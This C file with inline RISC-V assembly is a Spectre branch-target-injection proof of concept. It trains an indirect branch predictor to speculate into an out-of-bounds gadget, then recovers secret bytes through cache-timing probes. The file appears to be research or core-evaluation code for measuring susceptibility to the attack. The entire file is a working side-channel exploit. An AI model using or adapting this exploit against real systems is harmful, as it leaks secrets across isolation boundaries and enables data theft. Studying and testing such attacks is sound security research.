#include <string.h>

#include "spectre.h"

/* Longer than the 64-bit TAGE global history: the attack call always sees a
 * full taken history and is always mispredicted (a 7-long pattern is learned). */
#ifndef TRAIN_TIMES
#define TRAIN_TIMES 70
#endif
#ifndef ROUNDS
#define ROUNDS 3
#endif
#define ARRAY1_SZ 16
#define QUARTERS 4
#define QUARTER_SZ 64

/* first N secret bytes only; for quick tuning runs */
#ifndef ATTACK_BYTES
#define ATTACK_BYTES SECRET_SZ
#endif
#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 1
#endif

/*
 * One 16 KB probe array per round, with a different base each round.  A line
 * cached by an earlier round has a different tag, so it cannot be mistaken
 * for a hit in a later round.
 */
#define ARRAY2 ((volatile uint8_t *)ARRAY2_BASE)
static volatile uint8_t *probe_base = ARRAY2;
static uint8_t hits[256] __attribute__((aligned(64)));

/* The architectural (correct) target; the predictor is trained elsewhere. */
static void __attribute__((noinline)) wantFunc(void)
{
  __asm__ volatile("nop");
}

/* Unconditional OOB gadget: only correct execution of this is harmless. */
static void __attribute__((noinline)) victimFunc(uint64_t idx)
{
  uint8_t dummy = probe_base[spectre_secret.array1[idx] * L1_BLOCK];
  __asm__ volatile("" : : "r"(dummy));
}

int main(void)
{
  uint64_t t0 = spectre_rdcycle();
  uint64_t wantAddr = (uint64_t)&wantFunc;
  uint64_t victimAddr = (uint64_t)&victimFunc;
  uint64_t attackIdx =
      (uint64_t)(spectre_secret.secret - (char *)spectre_secret.array1);
  uint8_t dummy = 0;

  spectre_flush();

  for (uint64_t len = 0; len < ATTACK_BYTES; len++) {
    memset(hits, 0, sizeof hits);

    for (uint64_t round = 0; round < ROUNDS; round++) {
      volatile uint8_t *base =
          ARRAY2 + (len * ROUNDS + round) * 256 * L1_BLOCK;
      probe_base = base;

      /*
       * Probe one quarter of the possible byte values at a time.  The
       * speculative gadget leaves exactly one line of the current base in L1,
       * and that line is the only access to its set inside the quarter, so
       * random replacement cannot evict it before the probe.
       */
      for (int q = 0; q < QUARTERS; q++) {
        for (uint64_t r = 0; r < ATTACK_SAME_ROUNDS; r++) {
          for (int64_t j = (TRAIN_TIMES + 1) - 1; j >= 0; --j) {
            uint64_t sel =
                (uint64_t)((j % (TRAIN_TIMES + 1)) - 1) & ~(uint64_t)0xffff;
            sel |= sel >> 16;

            /* The last call (sel == ~0) is the architectural jump to
             * wantFunc; the predictor expects victimFunc and speculates
             * into it. */
            uint64_t passInAddr = victimAddr ^ (sel & (wantAddr ^ victimAddr));
            uint64_t randIdx = q % ARRAY1_SZ;
            uint64_t passInIdx = randIdx ^ (sel & (attackIdx ^ randIdx));

            for (int k = 0; k < 30; k++)
              __asm__ volatile("");

            /* jalr target is delayed by the fdiv chain so the front end
             * speculates to the trained target instead of waiting. */
            __asm__ volatile(
              "addi %[addr], %[addr], -2\n"
              "li t1, 2\n"
              "slli t2, t1, 4\n"
              "fcvt.s.lu fa4, t1\n"
              "fcvt.s.lu fa5, t2\n"
              "fdiv.s fa5, fa5, fa4\n"
              "fdiv.s fa5, fa5, fa4\n"
              "fdiv.s fa5, fa5, fa4\n"
              "fdiv.s fa5, fa5, fa4\n"
              "fcvt.lu.s t2, fa5, rtz\n"
              "add %[addr], %[addr], t2\n"
              "mv a0, %[arg]\n"
              "jalr ra, %[addr], 0\n"
              : [addr] "+r"(passInAddr)
              : [arg] "r"(passInIdx)
              : "t0", "t1", "t2", "t3", "t4", "t5", "t6",
                "a0", "a1", "a2", "a3", "a4", "a5", "a6", "a7", "ra",
                "fa0", "fa1", "fa2", "fa3", "fa4", "fa5", "fa6", "fa7",
                "memory");
          }
        }

        for (int i = q * QUARTER_SZ; i < (q + 1) * QUARTER_SZ; i++) {
          uint64_t start = spectre_rdcycle();
          dummy &= base[i * L1_BLOCK];
          __asm__ volatile("fence" ::: "memory");
          uint64_t diff = spectre_rdcycle() - start;
          if (diff < CACHE_HIT_THRESHOLD)
            hits[i]++;
        }
      }
    }

    /* array1[] is all zero, so every in-bounds call touches line 0. */
    hits[0] = 0;

    uint8_t idx[2];
    uint64_t cnt[2];
    spectre_top_two(hits, idx, cnt);
    spectre_result.recovered[len] = idx[0];
    spectre_result.alt[len] = idx[1];
    spectre_result.count0[len] = (uint8_t)cnt[0];
    spectre_result.count1[len] = (uint8_t)cnt[1];

    attackIdx++;
  }

  (void)dummy;
  spectre_result.cycles = spectre_rdcycle() - t0;
  spectre_result.attempted = ATTACK_BYTES;
  spectre_result.rounds = ROUNDS;
  spectre_finish();
}
